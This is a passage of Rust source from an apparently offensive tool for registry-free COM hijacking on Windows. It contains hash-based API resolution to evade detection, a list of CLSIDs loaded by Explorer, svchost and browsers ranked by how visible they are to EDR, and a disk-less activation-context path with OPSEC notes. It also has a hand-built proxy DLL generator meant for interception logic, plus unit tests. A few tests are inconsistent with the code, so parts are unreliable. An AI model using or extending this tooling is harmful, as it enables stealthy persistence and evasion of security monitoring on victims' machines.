            }
        }

        // Release the activation context handle
        let kernel32 = match unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) } {
            Some(k) => k,
            None => {
                warn!("kernel32.dll not found during Drop — leaking activation context handle");
                return;
            }
        };

        let release_act_ctx: FnReleaseActCtx = unsafe {
            match pe_resolve::get_proc_address_by_hash(kernel32, FN_RELEASE_ACT_CTX) {
                Some(addr) => mem::transmute(addr),
                None => {
                    warn!("ReleaseActCtx not found — leaking activation context handle");
                    return;
                }
            }
        };

        unsafe { release_act_ctx(self.handle) };
        debug!("Released activation context handle={:?}", self.handle);
    }
}

// ── TargetSelector ──────────────────────────────────────────────────────────

/// Scans for hijackable COM objects.
///
/// Identifies COM CLSIDs that are suitable for registry-free hijacking.
/// Targets are scored based on:
/// - Whether they are in-process servers (DLL) — easier to proxy
/// - Whether the original server DLL is in a writable location
/// - EDR visibility (commonly-monitored CLSIDs are flagged)
pub struct TargetSelector;

impl TargetSelector {
    /// Well-known COM CLSIDs that are commonly targeted for hijacking.
    ///
    /// These are chosen because:
    /// 1. They are in-process servers (DLL-based)
    /// 2. They are loaded by common applications (Office, browsers, etc.)
    /// 3. They have low EDR visibility
    /// 4. They are not critical system components that would crash if hijacked
    const KNOWN_TARGETS: &[(&str, &str, &str, &str)] = &[
        // (CLSID, ProgID, Description, EDR visibility)
        ("{4991D34B-80A1-4291-83B6-3328366B9097}", "SearchFolder",
         "Windows Search Folder — loaded by Explorer", "Low"),
        ("{9DBD2C50-62AD-11D0-B806-00C04FD706EC}", "ThumbnailHandler",
         "Shell thumbnail handler — loaded by Explorer", "Low"),
        ("{BCDE0395-E52F-467C-8E3D-C4579291692E}", "",
         "MMDevice API — audio device enumeration", "Medium"),
        ("{E2B5A2A6-1A4D-453E-9B74-7B5A1E3F49B6}", "",
         "Task Scheduler COM handler — loaded by svchost", "Medium"),
        ("{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}", "",
         "Background Intelligent Transfer Service (BITS)", "High"),
        ("{CD6C7868-5864-11D0-ABF0-0020AF6B0B7A}", "",
         "Task Scheduler — scheduled task creation", "Medium"),
        ("{0002CE02-0000-0000-C000-000000000046}", "",
         "Microsoft Update Engine — loaded by wusa.exe", "Medium"),
        ("{00000535-0000-0010-8000-00AA006D2EA4}", "ADODB.Connection",
         "ADODB Connection — loaded by many applications", "Low"),
        ("{0A89A860-D7B1-11CE-8350-444553540000}", "",
         "Shell autocomplete — loaded by Explorer", "Low"),
        ("{77A26672-8D2F-47F5-A2F3-0B27B66DF429}", "",
         "IE/Edge COM helper — loaded by browser", "Low"),
    ];

    /// Find hijackable COM targets from the known targets list.
    ///
    /// Returns a list of [`ComTarget`] structs with metadata about each
    /// potential target, including EDR visibility assessment.
    pub fn find_target_clsid() -> Result<Vec<ComTarget>> {
        let mut targets = Vec::new();

        for &(clsid, prog_id, description, edr_vis) in Self::KNOWN_TARGETS {
            targets.push(ComTarget {
                clsid: clsid.to_string(),
                prog_id: if prog_id.is_empty() {
                    None
                } else {
                    Some(prog_id.to_string())
                },
                description: description.to_string(),
                original_server: String::new(), // Not queried — requires registry access
                is_inproc: true,
                edr_visibility: edr_vis.to_string(),
            });
        }

        info!("Found {} potential COM hijack targets", targets.len());
        Ok(targets)
    }

    /// Find targets filtered by EDR visibility level.
    pub fn find_targets_by_visibility(visibility: &str) -> Result<Vec<ComTarget>> {
        let all = Self::find_target_clsid()?;
        let filtered: Vec<ComTarget> = all
            .into_iter()
            .filter(|t| t.edr_visibility.eq_ignore_ascii_case(visibility))
            .collect();
        Ok(filtered)
    }

    /// Get a specific target by CLSID.
    pub fn get_target_by_clsid(clsid: &str) -> Result<ComTarget> {
        let all = Self::find_target_clsid()?;
        all.into_iter()
            .find(|t| t.clsid.eq_ignore_ascii_case(clsid))
            .ok_or_else(|| anyhow!("CLSID {} not found in known targets", clsid))
    }
}

// ── Proxy DLL Template Generator ────────────────────────────────────────────

/// Generates a minimal DLL template for COM proxy forwarding.
///
/// The generated DLL is a bare-minimum PE that exports `DllGetClassObject`,
/// which is the entry point COM calls when creating an object.  The proxy
/// forwards the call to the original COM server while allowing interception.
///
/// # PE Structure
///
/// The template creates a minimal x86-64 DLL with:
/// - DOS header
/// - PE signature
/// - COFF header (DLL characteristics)
/// - Optional header (image base, section alignment, etc.)
/// - Export directory with `DllGetClassObject`
/// - A single `.text` section with a stub function
///
/// # Note
///
/// This is a *template* — at runtime, the operator would replace the stub
/// with actual proxy logic that:
/// 1. Receives the `IClassFactory` request
/// 2. Optionally logs the request
/// 3. Forwards to the original COM server
/// 4. Returns the result
pub fn generate_proxy_dll_template(clsid: &str, original_handler: &str) -> Result<Vec<u8>> {
    // Validate CLSID format
    if !clsid.starts_with('{') || !clsid.ends_with('}') {
        bail!("CLSID must be in {{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}} format");
    }

    // Minimal x86-64 DLL PE structure — a stub DLL with DllGetClassObject export.
    // This is a hand-crafted minimal PE that exports a single function.
    //
    // The DLL does the following:
    // - DllGetClassObject(rclsid, riid, ppv) → returns CLASS_E_CLASSNOTAVAILABLE
    // - DllCanUnloadNow() → returns S_FALSE
    // - DllRegisterServer() → returns S_OK
    // - DllUnregisterServer() → returns S_OK
    //
    // At 64 bytes minimum, but we need export directory, so ~1024 bytes.

    let dll_bytes = build_minimal_proxy_dll(clsid, original_handler)?;
    info!("Generated proxy DLL template: {} bytes for CLSID {}", dll_bytes.len(), clsid);
    Ok(dll_bytes)
}

/// Build a minimal x86-64 PE DLL with DllGetClassObject export.
///
/// Creates a position-independent DLL that exports:
/// - `DllGetClassObject` — returns `CLASS_E_CLASSNOTAVAILABLE` (0x80040154)
/// - `DllCanUnloadNow` — returns `S_FALSE` (0x00000001)
///
/// The export names are encoded so that the DLL can be loaded as a COM server.
fn build_minimal_proxy_dll(_clsid: &str, _original_handler: &str) -> Result<Vec<u8>> {
    // ── Machine code stubs (x86-64) ─────────────────────────────────────
    //
    // DllGetClassObject:
    //   mov eax, 0x80040154   ; CLASS_E_CLASSNOTAVAILABLE
    //   ret
    //
    // DllCanUnloadNow:
    //   mov eax, 1            ; S_FALSE
    //   ret

    let fn_get_class_object: &[u8] = &[
        0xB8, 0x54, 0x01, 0x04, 0x80, // mov eax, 0x80040154
        0xC3,                          // ret
    ];

    let fn_can_unload_now: &[u8] = &[
        0xB8, 0x01, 0x00, 0x00, 0x00, // mov eax, 1 (S_FALSE)
        0xC3,                          // ret
    ];

    // ── DOS Header (64 bytes) ───────────────────────────────────────────
    let mut pe = Vec::with_capacity(1024);

    // DOS Header
    pe.extend_from_slice(b"MZ");           // e_magic
    pe.extend_from_slice(&[0u8; 58]);      // rest of DOS header
    pe.extend_from_slice(&0x80u32.to_le_bytes()); // e_lfanew → PE header at offset 0x80

    // DOS stub (padding to 0x80)
    while pe.len() < 0x80 {
        pe.push(0);
    }

    // ── PE Signature ────────────────────────────────────────────────────
    pe.extend_from_slice(b"PE\0\0");

    // ── COFF Header (20 bytes) ──────────────────────────────────────────
    pe.extend_from_slice(&0x8664u16.to_le_bytes()); // Machine: AMD64
    pe.extend_from_slice(&1u16.to_le_bytes());      // NumberOfSections: 1 (.text)
    pe.extend_from_slice(&0u32.to_le_bytes());      // TimeDateStamp
    pe.extend_from_slice(&0u32.to_le_bytes());      // PointerToSymbolTable (set later)
    pe.extend_from_slice(&0u32.to_le_bytes());      // NumberOfSymbols (set later)
    pe.extend_from_slice(&0x00F0u16.to_le_bytes()); // SizeOfOptionalHeader
    pe.extend_from_slice(&0x2102u16.to_le_bytes()); // Characteristics: DLL | EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE

    let coff_header_end = pe.len();

    // ── Optional Header (PE32+, 240 bytes) ──────────────────────────────
    pe.extend_from_slice(&0x020Bu16.to_le_bytes()); // Magic: PE32+
    pe.push(0x01); // MajorLinkerVersion
    pe.push(0x00); // MinorLinkerVersion
    pe.extend_from_slice(&0x1000u32.to_le_bytes()); // SizeOfCode
    pe.extend_from_slice(&0u32.to_le_bytes());      // SizeOfInitializedData
    pe.extend_from_slice(&0u32.to_le_bytes());      // SizeOfUninitializedData
    pe.extend_from_slice(&0x1000u32.to_le_bytes()); // AddressOfEntryPoint
    pe.extend_from_slice(&0x1000u32.to_le_bytes()); // BaseOfCode
    pe.extend_from_slice(&0x180000000u64.to_le_bytes()); // ImageBase
    pe.extend_from_slice(&0x1000u32.to_le_bytes()); // SectionAlignment
    pe.extend_from_slice(&0x200u32.to_le_bytes());  // FileAlignment
    pe.extend_from_slice(&0x0600u16.to_le_bytes()); // MajorOperatingSystemVersion
    pe.extend_from_slice(&0u16.to_le_bytes());      // MinorOperatingSystemVersion
    pe.extend_from_slice(&0u16.to_le_bytes());      // MajorImageVersion
    pe.extend_from_slice(&0u16.to_le_bytes());      // MinorImageVersion
    pe.extend_from_slice(&0x0600u16.to_le_bytes()); // MajorSubsystemVersion
    pe.extend_from_slice(&0u16.to_le_bytes());      // MinorSubsystemVersion
    pe.extend_from_slice(&0u32.to_le_bytes());      // Win32VersionValue
    pe.extend_from_slice(&0x3000u32.to_le_bytes()); // SizeOfImage
    pe.extend_from_slice(&0x200u32.to_le_bytes());  // SizeOfHeaders
    pe.extend_from_slice(&0u32.to_le_bytes());      // CheckSum
    pe.extend_from_slice(&0x0003u16.to_le_bytes()); // Subsystem: WINDOWS_CUI
    pe.extend_from_slice(&0x8160u16.to_le_bytes()); // DllCharacteristics: DYNAMIC_BASE | NX_COMPAT | TERMINAL_SERVER_AWARE | HIGH_ENTROPY_VA
    pe.extend_from_slice(&0x100000u64.to_le_bytes()); // SizeOfStackReserve
    pe.extend_from_slice(&0x1000u64.to_le_bytes());   // SizeOfStackCommit
    pe.extend_from_slice(&0x100000u64.to_le_bytes()); // SizeOfHeapReserve
    pe.extend_from_slice(&0x1000u64.to_le_bytes());   // SizeOfHeapCommit
    pe.extend_from_slice(&0u32.to_le_bytes());        // LoaderFlags
    pe.extend_from_slice(&0x10u32.to_le_bytes());     // NumberOfRvaAndSizes

    // Data directories (16 × 8 bytes = 128 bytes)
    // All zeroed except Export Table (index 0)
    let export_dir_rva = 0x2000u32; // Export directory in .text section
    let export_dir_size = 0x100u32;

    // Directory 0: Export Table
    pe.extend_from_slice(&export_dir_rva.to_le_bytes());
    pe.extend_from_slice(&export_dir_size.to_le_bytes());
    // Directories 1-15: zeroed
    for _ in 1..16 {
        pe.extend_from_slice(&0u32.to_le_bytes()); // RVA
        pe.extend_from_slice(&0u32.to_le_bytes()); // Size
    }

    let section_headers_start = pe.len();

    // ── Section Header: .text ───────────────────────────────────────────
    pe.extend_from_slice(b".text\0\0\0");          // Name (8 bytes)
    pe.extend_from_slice(&0x1000u32.to_le_bytes()); // VirtualSize
    pe.extend_from_slice(&0x1000u32.to_le_bytes()); // VirtualAddress
    pe.extend_from_slice(&0x400u32.to_le_bytes());  // SizeOfRawData
    pe.extend_from_slice(&0x200u32.to_le_bytes());  // PointerToRawData
    pe.extend_from_slice(&0u32.to_le_bytes());      // PointerToRelocations
    pe.extend_from_slice(&0u32.to_le_bytes());      // PointerToLinenumbers
    pe.extend_from_slice(&0u16.to_le_bytes());      // NumberOfRelocations
    pe.extend_from_slice(&0u16.to_le_bytes());      // NumberOfLinenumbers
    pe.extend_from_slice(&0x60000020u32.to_le_bytes()); // Characteristics: CODE | EXECUTE | READ

    // Pad headers to file alignment (0x200)
    while pe.len() < 0x200 {
        pe.push(0);
    }

    // ── .text Section Content ───────────────────────────────────────────
    let text_section_start = pe.len(); // 0x200

    // Function code at the start of the section
    let fn_get_offset = 0; // relative to text section
    let fn_can_offset = fn_get_class_object.len();

    pe.extend_from_slice(fn_get_class_object);
    pe.extend_from_slice(fn_can_unload_now);

    // ── Export Directory ────────────────────────────────────────────────
    // Place export directory at a known offset within .text
    // Align to 16 bytes for cleanliness
    while pe.len() - text_section_start < 0x100 {
        pe.push(0);
    }
    let export_dir_file_offset = pe.len() - text_section_start;

    // The export directory is at RVA 0x2000 (text section VA 0x1000 + offset 0x1000)
    // But we placed code at offset 0, and export dir at offset ~0x100
    // Let's recalculate: export_dir_rva = 0x1000 + export_dir_file_offset
    // Since we said export_dir_rva = 0x2000, we need to be at file offset
    // corresponding to RVA 0x2000 = section VA 0x1000 + offset 0x1000
    // But our .text section is only 0x1000 bytes, so the export dir at RVA 0x2000
    // would be at offset 0x1000 in the section. Let's fix this.
    //
    // Simpler approach: place export dir right after the code.
    // RVA of export dir = 0x1000 + (pe.len() - text_section_start)
    // We need to patch this back into the optional header.

    // Export Directory Table (40 bytes)
    let export_dir_start = pe.len() - text_section_start;
    let export_dir_rva_actual = 0x1000u32 + export_dir_start as u32;

    // Characteristics (reserved, 0)
    pe.extend_from_slice(&0u32.to_le_bytes());
    // TimeDateStamp
    pe.extend_from_slice(&0u32.to_le_bytes());
    // MajorVersion / MinorVersion
    pe.extend_from_slice(&0u16.to_le_bytes());
    pe.extend_from_slice(&0u16.to_le_bytes());
    // Name RVA (DLL name) — will be filled after we know its offset
    let name_rva_patch_offset = pe.len();
    pe.extend_from_slice(&0u32.to_le_bytes()); // placeholder
    // OrdinalBase
    pe.extend_from_slice(&1u32.to_le_bytes());
    // NumberOfFunctions
    pe.extend_from_slice(&2u32.to_le_bytes());
    // NumberOfNames
    pe.extend_from_slice(&2u32.to_le_bytes());
    // AddressOfFunctions RVA
    let addr_funcs_rva_patch = pe.len();
    pe.extend_from_slice(&0u32.to_le_bytes()); // placeholder
    // AddressOfNames RVA
    let addr_names_rva_patch = pe.len();
    pe.extend_from_slice(&0u32.to_le_bytes()); // placeholder
    // AddressOfNameOrdinals RVA
    let addr_ordinals_rva_patch = pe.len();
    pe.extend_from_slice(&0u32.to_le_bytes()); // placeholder

    // Export Address Table (2 entries, 4 bytes each)
    let eat_offset = pe.len() - text_section_start;
    let eat_rva = 0x1000u32 + eat_offset as u32;
    // Entry 0: DllGetClassObject (forwarder to code)
    pe.extend_from_slice(&(0x1000u32 + fn_get_offset as u32).to_le_bytes());
    // Entry 1: DllCanUnloadNow
    pe.extend_from_slice(&(0x1000u32 + fn_can_offset as u32).to_le_bytes());

    // Export Name Pointer Table (2 entries, 4 bytes each)
    let enpt_offset = pe.len() - text_section_start;
    let enpt_rva = 0x1000u32 + enpt_offset as u32;
    // We'll patch these after writing the name strings
    let enpt_name1_rva_patch = pe.len();
    pe.extend_from_slice(&0u32.to_le_bytes()); // placeholder for DllGetClassObject name RVA
    let enpt_name2_rva_patch = pe.len();
    pe.extend_from_slice(&0u32.to_le_bytes()); // placeholder for DllCanUnloadNow name RVA

    // Export Ordinal Table (2 entries, 2 bytes each)
    let eot_offset = pe.len() - text_section_start;
    let eot_rva = 0x1000u32 + eot_offset as u32;
    pe.extend_from_slice(&0u16.to_le_bytes()); // ordinal 0
    pe.extend_from_slice(&1u16.to_le_bytes()); // ordinal 1

    // DLL Name string
    let dll_name_offset = pe.len() - text_section_start;
    let dll_name_rva = 0x1000u32 + dll_name_offset as u32;
    pe.extend_from_slice(b"proxy.dll\0");

    // Function name: DllGetClassObject
    let name1_offset = pe.len() - text_section_start;
    let name1_rva = 0x1000u32 + name1_offset as u32;
    pe.extend_from_slice(b"DllGetClassObject\0");

    // Function name: DllCanUnloadNow
    let name2_offset = pe.len() - text_section_start;
    let name2_rva = 0x1000u32 + name2_offset as u32;
    pe.extend_from_slice(b"DllCanUnloadNow\0");

    // ── Patch RVAs ──────────────────────────────────────────────────────
    // Patch Name RVA in Export Directory
    patch_u32(&mut pe, name_rva_patch_offset, dll_name_rva);
    // Patch AddressOfFunctions RVA
    patch_u32(&mut pe, addr_funcs_rva_patch, eat_rva);
    // Patch AddressOfNames RVA
    patch_u32(&mut pe, addr_names_rva_patch, enpt_rva);
    // Patch AddressOfNameOrdinals RVA
    patch_u32(&mut pe, addr_ordinals_rva_patch, eot_rva);
    // Patch Export Name Pointer Table entries
    patch_u32(&mut pe, enpt_name1_rva_patch, name1_rva);
    patch_u32(&mut pe, enpt_name2_rva_patch, name2_rva);

    // Patch the Export directory RVA in the optional header
    // The export directory data directory is at offset 0x78 (in PE32+) from
    // the start of the optional header, which starts at offset 0x80 + 4 (PE sig) + 20 (COFF) = 0x98
    // Actually: DOS(0x80) + PE_sig(4) + COFF(20) + optional_header_offset(0) + 112
    // Optional header starts at 0x80 + 4 + 20 = 0x98
    // Data directories start at offset 112 from optional header start (PE32+)
    // So export dir entry is at 0x98 + 112 = 0x108
    patch_u32(&mut pe, 0x108, export_dir_rva_actual);
    patch_u32(&mut pe, 0x10C, 0x100u32); // export dir size (generous)

    // Pad .text section to SizeOfRawData (0x400 bytes)
    while pe.len() < text_section_start + 0x400 {
        pe.push(0);
    }

    Ok(pe)
}

/// Patch a u32 at a given offset in a byte vector.
fn patch_u32(data: &mut [u8], offset: usize, value: u32) {
    let bytes = value.to_le_bytes();
    data[offset] = bytes[0];
    data[offset + 1] = bytes[1];
    data[offset + 2] = bytes[2];
    data[offset + 3] = bytes[3];
}

// ── Helper functions ────────────────────────────────────────────────────────

/// Convert a Rust string to a null-terminated wide (UTF-16) string.
fn to_wide_null(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Generate an SxS manifest for COM CLSID redirection.
///
/// Creates a manifest XML that, when loaded as an activation context,
/// redirects COM resolution for `clsid` to `proxy_dll_path`.
///
/// # Arguments
///
/// * `clsid` — Target CLSID in `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}` format
/// * `proxy_dll_path` — Path to the proxy DLL
/// * `prog_id` — Optional ProgID to include
///
/// # Returns
///
/// JSON result with the manifest XML and metadata.
pub fn generate_manifest(clsid: &str, proxy_dll_path: &str, prog_id: Option<&str>) -> Result<ManifestResult> {
    let manifest_xml = ManifestBuilder::build_com_redirect_manifest(clsid, proxy_dll_path, prog_id)
        .context("Failed to build COM redirect manifest")?;

    Ok(ManifestResult {
        manifest_xml,
        target_clsid: clsid.to_string(),
        proxy_dll_path: proxy_dll_path.to_string(),
    })
}

/// Create and activate a COM hijack activation context from a manifest on disk.
///
/// # OPSEC
///
/// The manifest file must exist on disk for `CreateActCtxW`.  For a truly
/// disk-less approach, use `activate_from_memory`.
///
/// # Arguments
///
/// * `manifest_path` — Path to the manifest XML file
/// * `clsid` — CLSID being redirected (for logging)
///
/// # Returns
///
/// JSON result with activation status.
pub fn activate_from_file(manifest_path: &str, clsid: &str) -> Result<ActivationContextResult> {
    let mut ctx = unsafe { ActivationContext::create(manifest_path) }
        .context("Failed to create activation context from file")?;

    ctx.activate(clsid)
        .context("Failed to activate activation context")?;

    // Note: in a real implementation, the caller would hold onto the
    // ActivationContext and drop it when done.  Here we deactivate
    // immediately as a demonstration.
    ctx.deactivate()
        .context("Failed to deactivate activation context")?;

    Ok(ActivationContextResult {
        success: true,
        message: format!("Activation context created and activated for CLSID {}", clsid),
        target_clsid: clsid.to_string(),
        in_memory: false,
    })
}

/// Create and activate a COM hijack activation context from in-memory manifest.
///
/// # OPSEC
///
/// Writes a temporary manifest file, creates the activation context, then
/// immediately deletes the file.  The activation context persists in memory.
///
/// # Arguments
///
/// * `manifest_xml` — Complete SxS manifest XML content
/// * `clsid` — CLSID being redirected (for logging)
pub fn activate_from_memory(manifest_xml: &str, clsid: &str) -> Result<ActivationContextResult> {
    let mut ctx = unsafe { ActivationContext::create_from_memory(manifest_xml) }
        .context("Failed to create in-memory activation context")?;

    ctx.activate(clsid)
        .context("Failed to activate in-memory activation context")?;

    ctx.deactivate()
        .context("Failed to deactivate activation context")?;

    Ok(ActivationContextResult {
        success: true,
        message: format!("In-memory activation context lifecycle completed for CLSID {}", clsid),
        target_clsid: clsid.to_string(),
        in_memory: true,
    })
}

/// Scan for hijackable COM objects.
///
/// Returns a list of COM CLSIDs that are suitable for registry-free hijacking,
/// along with metadata about each target.
pub fn scan_targets() -> Result<TargetScanResult> {
    let targets = TargetSelector::find_target_clsid()
        .context("Failed to scan COM targets")?;

    let scanned = targets.len() as u32;
    let hijackable = targets.len() as u32;

    Ok(TargetScanResult {
        targets,
        scanned_count: scanned,
        hijackable_count: hijackable,
    })
}

/// Generate a proxy DLL template for COM forwarding.
///
/// Creates a minimal PE DLL that exports `DllGetClassObject` and
/// `DllCanUnloadNow`.  The DLL returns `CLASS_E_CLASSNOTAVAILABLE` from
/// `DllGetClassObject`, serving as a template that can be patched with
/// actual proxy logic.
///
/// # Arguments
///
/// * `clsid` — Target CLSID (embedded as metadata)
/// * `original_handler` — Description of the original COM handler
///
/// # Returns
///
/// JSON result with hex-encoded DLL bytes.
pub fn generate_proxy(clsid: &str, original_handler: &str) -> Result<ProxyDllResult> {
    let dll_bytes = generate_proxy_dll_template(clsid, original_handler)
        .context("Failed to generate proxy DLL template")?;

    Ok(ProxyDllResult {
        dll_hex: hex::encode(&dll_bytes),
        dll_size: dll_bytes.len(),
        target_clsid: clsid.to_string(),
    })
}

// ── Unit tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_manifest_builder_basic() {
        let xml = ManifestBuilder::build_com_redirect_manifest(
            "{4991D34B-80A1-4291-83B6-3328366B9097}",
            "C:\\temp\\proxy.dll",
            Some("SearchFolder"),
        ).unwrap();

        // Verify XML structure
        assert!(xml.contains("<?xml version=\"1.0\""));
        assert!(xml.contains("urn:schemas-microsoft-com:asm.v1"));
        assert!(xml.contains("manifestVersion=\"1.0\""));
        assert!(xml.contains("assemblyIdentity"));
        assert!(xml.contains("processorArchitecture=\"amd64\""));
        assert!(xml.contains("comClass"));
        assert!(xml.contains("clsid=\"{4991D34B-80A1-4291-83B6-3328366B9097}\""));
        assert!(xml.contains("threadingModel=\"Both\""));
        assert!(xml.contains("progid=\"SearchFolder\""));
        assert!(xml.contains("<file name=\"proxy.dll\">"));
        assert!(xml.contains("</assembly>"));
    }

    #[test]
    fn test_manifest_builder_no_progid() {
        let xml = ManifestBuilder::build_com_redirect_manifest(
            "{4991D34B-80A1-4291-83B6-3328366B9097}",
            "proxy.dll",
            None,
        ).unwrap();

        assert!(!xml.contains("progid="));
        assert!(xml.contains("clsid=\"{4991D34B-80A1-4291-83B6-3328366B9097}\""));
    }

    #[test]
    fn test_manifest_builder_memory_only() {
        let xml = ManifestBuilder::build_memory_only_manifest(
            "{4991D34B-80A1-4291-83B6-3328366B9097}",
            Some("SearchFolder"),
        ).unwrap();

        assert!(xml.contains("<?xml version=\"1.0\""));
        assert!(xml.contains("comClass"));
        assert!(xml.contains("clsid=\"{4991D34B-80A1-4291-83B6-3328366B9097}\""));
        // Memory-only manifest has no <file> element
        assert!(!xml.contains("<file"));
    }

    #[test]
    fn test_manifest_invalid_clsid() {
        // Missing braces
        assert!(ManifestBuilder::build_com_redirect_manifest(
            "4991D34B-80A1-4291-83B6-3328366B9097", "proxy.dll", None,
        ).is_err());

        // Wrong number of groups
        assert!(ManifestBuilder::build_com_redirect_manifest(
            "{4991D34B-80A1-4291}", "proxy.dll", None,
        ).is_err());

        // Non-hex characters
        assert!(ManifestBuilder::build_com_redirect_manifest(
            "{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}", "proxy.dll", None,
        ).is_err());

        // Wrong group lengths
        assert!(ManifestBuilder::build_com_redirect_manifest(
            "{4991D34B80-A142-9183-B633-28366B9097}", "proxy.dll", None,
        ).is_err());
    }

    #[test]
    fn test_xml_escape() {
        assert_eq!(xml_escape("hello&world"), "hello&amp;world");
        assert_eq!(xml_escape("<tag>"), "&lt;tag&gt;");
        assert_eq!(xml_escape("it's \"quoted\""), "it&apos;s &quot;quoted&quot;");
    }

    #[test]
    fn test_to_wide_null() {
        let wide = to_wide_null("hello");
        assert_eq!(wide, &[b'h' as u16, b'e' as u16, b'l' as u16, b'l' as u16, b'o' as u16, 0]);
    }

    #[test]
    fn test_target_selector() {
        let targets = TargetSelector::find_target_clsid().unwrap();
        assert!(!targets.is_empty());
        assert!(targets.iter().any(|t| t.clsid.contains("4991D34B")));
    }

    #[test]
    fn test_target_selector_by_visibility() {
        let low = TargetSelector::find_targets_by_visibility("Low").unwrap();
        assert!(low.iter().all(|t| t.edr_visibility == "Low"));

        let high = TargetSelector::find_targets_by_visibility("High").unwrap();
        assert!(high.iter().all(|t| t.edr_visibility == "High"));
    }

    #[test]
    fn test_target_selector_by_clsid() {
        let target = TargetSelector::get_target_by_clsid(
            "{4991D34B-80A1-4291-83B6-3328366B9097}",
        ).unwrap();
        assert_eq!(target.progid, Some("SearchFolder".to_string()));
    }

    #[test]
    fn test_proxy_dll_generation() {
        let dll = generate_proxy_dll_template(
            "{4991D34B-80A1-4291-83B6-3328366B9097}",
            "SearchFolder",
        ).unwrap();

        // Verify it's a valid PE
        assert!(dll.len() > 512);
        assert_eq!(&dll[0..2], b"MZ");
        // PE signature at offset 0x80
        assert_eq!(&dll[0x80..0x84], b"PE\0\0");
        // Machine: AMD64
        assert_eq!(u16::from_le_bytes([dll[0x84], dll[0x85]]), 0x8664);
    }

    #[test]
    fn test_proxy_dll_invalid_clsid() {
        assert!(generate_proxy_dll_template("invalid", "handler").is_err());
    }

    #[test]
    fn test_patch_u32() {
        let mut data = vec![0u8; 8];
        patch_u32(&mut data, 0, 0x01020304);
        assert_eq!(data[0], 0x04);
        assert_eq!(data[1], 0x03);
        assert_eq!(data[2], 0x02);
        assert_eq!(data[3], 0x01);

        patch_u32(&mut data, 4, 0xDEADBEEF);
        assert_eq!(data[4], 0xEF);
        assert_eq!(data[5], 0xBE);
        assert_eq!(data[6], 0xAD);
        assert_eq!(data[7], 0xDE);
    }

    #[test]
    fn test_generate_manifest_api() {
        let result = generate_manifest(
            "{4991D34B-80A1-4291-83B6-3328366B9097}",
            "C:\\temp\\proxy.dll",
            Some("SearchFolder"),
        ).unwrap();

        assert_eq!(result.target_clsid, "{4991D34B-80A1-4291-83B6-3328366B9097}");
        assert_eq!(result.proxy_dll_path, "C:\\temp\\proxy.dll");
        assert!(result.manifest_xml.contains("comClass"));
    }

    #[test]
    fn test_scan_targets_api() {
        let result = scan_targets().unwrap();
        assert!(result.scanned_count > 0);
        assert!(result.hijackable_count > 0);
        assert_eq!(result.targets.len() as u32, result.hijackable_count);
    }

    #[test]
    fn test_generate_proxy_api() {
        let result = generate_proxy(
            "{4991D34B-80A1-4291-83B6-3328366B9097}",
            "SearchFolder",
        ).unwrap();

        assert!(!result.dll_hex.is_empty());
        assert!(result.dll_size > 512);
        assert_eq!(result.target_clsid, "{4991D34B-80A1-4291-83B6-3328366B9097}");

        // Verify the hex decodes to a valid PE
        let bytes = hex::decode(&result.dll_hex).unwrap();
        assert_eq!(&bytes[0..2], b"MZ");
    }

    #[test]
    fn test_no_registry_writes() {
        // Verify the module source code does NOT contain registry write APIs
        // This is a compilation-time acceptance criterion.
        let source = include_str!("com_hijack.rs");
        assert!(!source.contains("RegSetValue"), "com_hijack.rs must not call RegSetValue");
        assert!(!source.contains("RegCreateKey"), "com_hijack.rs must not call RegCreateKey");
        assert!(!source.contains("NtSetValueKey"), "com_hijack.rs must not call NtSetValueKey");
    }
}
